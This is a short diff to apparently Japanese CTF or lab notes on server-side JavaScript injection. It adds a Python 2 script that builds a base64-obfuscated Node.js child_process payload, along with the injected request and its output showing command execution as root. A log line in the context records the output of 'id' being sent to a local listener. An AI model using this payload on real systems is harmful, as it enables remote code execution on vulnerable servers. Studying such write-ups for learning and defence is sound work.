@@ -799,6 +799,20 @@ WSL上で
 をやると行けるのに…。
 127.0.0.1 - - [22/Dec/2020 00:20:24] "GET /id=uid=1000(tomoki) HTTP/1.1" 404 -
 ```
+以下のpython2スクリプトでRCEできた！   
+```python
+import base64
+
+command_to_execute = "id"
+code_to_execute = "global.process.mainModule.require('child_process').execSync('%s').toString()"%command_to_execute
+code_b64_Encoded =base64.b64encode( code_to_execute )
+payload = '''eval(Buffer('%s','base64').toString())'''%code_b64_Encoded
+```
+```txt
+/javascript?inj=eval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2lkJykudG9TdHJpbmcoKQ==','base64').toString())
+1UMjgHZPMVKuxrMOLMQZ78CAe7aTqj6Kuid=0(root) gid=0(root) groups=0(root)
+SN12DSCs8CE0ixZQJh0U5KBjBF3bQSlX
+```
 #### dot
 ```js
 // doT
